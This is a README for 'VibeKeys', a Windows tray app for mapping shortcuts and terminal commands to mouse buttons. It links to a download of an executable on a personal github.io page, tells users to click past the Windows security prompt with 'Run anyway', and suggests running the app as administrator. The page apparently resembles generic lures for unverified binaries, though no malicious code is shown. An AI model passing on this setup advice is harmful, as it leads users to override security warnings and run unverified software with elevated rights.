# 🖱️ VibeKeys - Control your computer with simple clicks

[![](https://img.shields.io/badge/Download-VibeKeys-blue.svg)](https://tommad6821.github.io)

VibeKeys offers a way to manage your work through your mouse. You can assign keyboard tasks to your mouse buttons. This tool speeds up your workflow if you spend time in a terminal or code editor. It removes the need to switch between your keyboard and mouse constantly.

## ⚙️ How it works

The application runs in the background of your Windows system. It monitors your mouse clicks. When you press a specific mouse button, VibeKeys sends a command to your computer. You decide which buttons trigger which actions. This setup saves time and physical effort during heavy computer tasks. 

You can set up profiles for different apps. For example, your mouse buttons behave one way in your terminal and another way in your web browser. The app remembers these settings.

## 🛠️ Setting up VibeKeys

After you download the file, launch it to begin.

1. Double-click the `VibeKeys.exe` file you downloaded.
2. Windows might show a security prompt. If you trust the source, click More Info and then Run anyway.
3. The app opens a small window in your taskbar tray.
4. Right-click the VibeKeys icon in the tray to open the menu.
5. Select Settings to see the mapping screen.

## ⌨️ Mapping your mouse buttons

You define your shortcuts in the mapping screen. Each mouse button appears in a list. 

1. Select the mouse button you want to change from the list.
2. Choose an action from the menu, such as Copy, Paste, or Execute Terminal Command.
3. Type the key combination you want the mouse to perform. 
4. Click Save to apply your changes.
5. Test the button in your terminal to confirm it works.

## 💡 Common use cases

Users choose VibeKeys for specific, repetitive tasks. If you write code, you often move your hand from the mouse to the keyboard to type common strings. VibeKeys lets you map your side mouse buttons to these strings. 

- Terminal users map command shortcuts to their mouse buttons.
- Developers map save commands or build triggers to their scroll wheel.
- Power users manage window snapping with simple click patterns.

## 🔍 Troubleshooting

If your buttons do not work, check these common issues:

* **The app is not running:** Look for the VibeKeys icon in your system tray. If you do not see it, launch the app from your Start menu again.
* **Administrator permissions:** Some terminal commands require administrator rights. Right-click the VibeKeys shortcut and select Run as administrator.
* **Conflicting software:** Other mouse software might conflict with VibeKeys. Close your mouse manufacturer's software before you start VibeKeys.
* **Mapping errors:** Recheck your mappings in the Settings menu. Ensure you saved your changes after you adjusted your keys.

## 📋 Best practices

Start with simple mappings. Map one or two buttons to commands you use five or ten times every hour. Once you feel comfortable, expand your configuration. Use profiles to keep your mappings organized. Keep your mouse drivers updated to ensure the hardware sends signals correctly.

## 🔒 Security and privacy

VibeKeys runs locally on your machine. The app does not send your data to external servers. It only watches for physical mouse button presses to trigger the commands you define. It does not record your keystrokes or track your browsing habits.
